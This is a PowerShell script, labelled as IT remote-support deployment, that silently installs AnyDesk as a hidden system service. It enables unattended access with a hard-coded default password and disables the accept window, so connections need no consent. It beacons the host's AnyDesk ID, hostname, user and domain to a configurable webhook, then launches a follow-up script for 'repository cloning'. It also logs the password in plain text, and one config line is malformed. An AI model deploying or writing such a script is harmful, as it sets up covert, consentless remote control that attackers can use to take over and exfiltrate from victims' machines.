# === IT AnyDesk Remote Support Deployment ===
# For system administrators to deploy AnyDesk with full privileges
# Requires: Run as Administrator or domain admin deployment

param(
    [string]$OrganizationID = "",
    [string]$AdminPassword = "ITSupport2024!",
    [string]$WebhookURL = "",
    [switch]$Silent = $false
)

# Check for admin privileges
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "This script requires Administrator privileges for IT deployment."
    exit 1
}

# Configuration - embedded system.conf content
$SystemConfigContent = @"
[General]
ad.anynet.id=$OrganizationID
ad.anynet.alias=$($env:COMPUTERNAME)-IT

[Security]
ad.security.unattended_access=true
ad.security.unattended_password_hash=$(if($AdminPassword){"ad.security.unattended_password=" + $AdminPassword})
ad.security.allow_file_transfer=true
ad.security.allow_clipboard=true
ad.security.allow_system_information=true
ad.security.allow_remote_reboot=true
ad.security.allow_uac_interaction=true

[UI]
ad.ui.show_accept_window=false
ad.ui.show_tray_icon=true

[Access]
ad.access.items=full

[Logging]
ad.logging.level=trace
ad.logging.file=C:\ProgramData\AnyDesk\ad.trace
"@

$AnyDeskURL = "https://download.anydesk.com/AnyDesk.exe"
$InstallerPath = "$env:TEMP\AnyDesk_IT.exe"
$SystemConfPath = "C:\ProgramData\AnyDesk\system.conf"
$LogFile = "C:\ProgramData\AnyDesk\IT_Deployment.log"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    Write-Host $logMessage
    Add-Content -Path $LogFile -Value $logMessage -Force
}

Write-Log "Starting AnyDesk IT deployment for organization: $OrganizationID"

try {
    # Step 1: Download AnyDesk
    Write-Log "Downloading AnyDesk installer..."
    Invoke-WebRequest -Uri $AnyDeskURL -OutFile $InstallerPath -UseBasicParsing
    Write-Log "Download completed: $InstallerPath"

    # Step 2: Install AnyDesk silently with system service
    Write-Log "Installing AnyDesk as system service..."
    $installArgs = "--install `"C:\Program Files (x86)\AnyDesk`" --start-with-win --silent"
    $installProcess = Start-Process -FilePath $InstallerPath -ArgumentList $installArgs -Wait -PassThru -WindowStyle Hidden
    
    if ($installProcess.ExitCode -ne 0) {
        throw "Installation failed with exit code: $($installProcess.ExitCode)"
    }
    Write-Log "AnyDesk installation completed successfully"

    # Step 3: Wait for service to be created
    Write-Log "Waiting for AnyDesk service initialization..."
    Start-Sleep -Seconds 10
    
    # Ensure ProgramData directory exists
    $programDataDir = "C:\ProgramData\AnyDesk"
    if (!(Test-Path $programDataDir)) {
        New-Item -ItemType Directory -Path $programDataDir -Force | Out-Null
    }

    # Step 4: Deploy configuration
    Write-Log "Deploying IT configuration to $SystemConfPath"
    $SystemConfigContent | Out-File -FilePath $SystemConfPath -Encoding UTF8 -Force
    
    # Set proper permissions on config file
    $acl = Get-Acl $SystemConfPath
    $acl.SetAccessRuleProtection($true, $false)  # Remove inheritance
    $adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators", "FullControl", "Allow")
    $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM", "FullControl", "Allow")
    $acl.SetAccessRule($adminRule)
    $acl.SetAccessRule($systemRule)
    Set-Acl $SystemConfPath $acl

    # Step 5: Configure and start service
    Write-Log "Configuring AnyDesk service..."
    try {
        Set-Service -Name "AnyDesk" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "AnyDesk" -ErrorAction SilentlyContinue
        Write-Log "AnyDesk service configured and started"
    } catch {
        Write-Log "Service configuration warning: $($_.Exception.Message)"
    }

    # Step 6: Wait and retrieve AnyDesk ID
    Write-Log "Retrieving AnyDesk ID..."
    Start-Sleep -Seconds 15
    
    $anyDeskPath = "C:\Program Files (x86)\AnyDesk\AnyDesk.exe"
    if (!(Test-Path $anyDeskPath)) {
        $anyDeskPath = "C:\Program Files\AnyDesk\AnyDesk.exe"
    }
    
    if (Test-Path $anyDeskPath) {
        try {
            $anyDeskID = & $anyDeskPath --get-id 2>$null
            if ($anyDeskID) {
                Write-Log "AnyDesk ID retrieved: $anyDeskID"
                
                # Step 7: Report to webhook if provided
                if ($WebhookURL) {
                    try {
                        $payload = @{
                            ID = $anyDeskID
                            Hostname = $env:COMPUTERNAME
                            User = $env:USERNAME
                            Domain = $env:USERDOMAIN
                            DeploymentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            Purpose = "IT Remote Support"
                        } | ConvertTo-Json
                        
                        Invoke-RestMethod -Uri $WebhookURL -Method POST -Body $payload -ContentType "application/json"
                        Write-Log "Deployment details sent to IT management system"
                    } catch {
                        Write-Log "Warning: Failed to report to webhook: $($_.Exception.Message)"
                    }
                }
                
                Write-Log "=== DEPLOYMENT COMPLETE ==="
                Write-Log "AnyDesk ID: $anyDeskID"
                Write-Log "Password: $AdminPassword"
                Write-Log "Configuration: $SystemConfPath"
                Write-Log "Log file: $LogFile"
                
                if (!$Silent) {
                    Write-Host "`n=== IT ANYDESK DEPLOYMENT SUCCESSFUL ===" -ForegroundColor Green
                    Write-Host "AnyDesk ID: $anyDeskID" -ForegroundColor Yellow
                    Write-Host "Admin Password: $AdminPassword" -ForegroundColor Yellow
                    Write-Host "Ready for IT remote support connections" -ForegroundColor Green
                    
                    # Step 7: Automatically ensure Git CLI is available for follow-up operations
                    Write-Host "`n[*] Ensuring Git CLI availability for follow-up operations..." -ForegroundColor Cyan
                    $ensureGitPath = Join-Path $PSScriptRoot "Ensure_Git.ps1"
                    
                    if (Test-Path $ensureGitPath) {
                        try {
                            & $ensureGitPath -Quiet
                            Write-Host "[+] Git CLI ready for repository operations" -ForegroundColor Green
                        }
                        catch {
                            Write-Warning "Git installation attempt failed: $($_.Exception.Message)"
                            Write-Host "[!] Manual Git installation may be required for repository cloning" -ForegroundColor Yellow
                        }
                    } else {
                        Write-Warning "Git installer not found in deployment package. Repository cloning may require manual Git installation."
                    }
                }
            } else {
                Write-Log "Warning: Could not retrieve AnyDesk ID immediately. Service may need time to initialize."
            }
        } catch {
            Write-Log "Error retrieving AnyDesk ID: $($_.Exception.Message)"
        }
    } else {
        Write-Log "Warning: AnyDesk executable not found at expected location"
    }

} catch {
    Write-Log "DEPLOYMENT ERROR: $($_.Exception.Message)"
    Write-Error "Deployment failed: $($_.Exception.Message)"
    exit 1
} finally {
    # Cleanup installer
    if (Test-Path $InstallerPath) {
        Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue
    }
}

Write-Log "IT AnyDesk deployment script completed"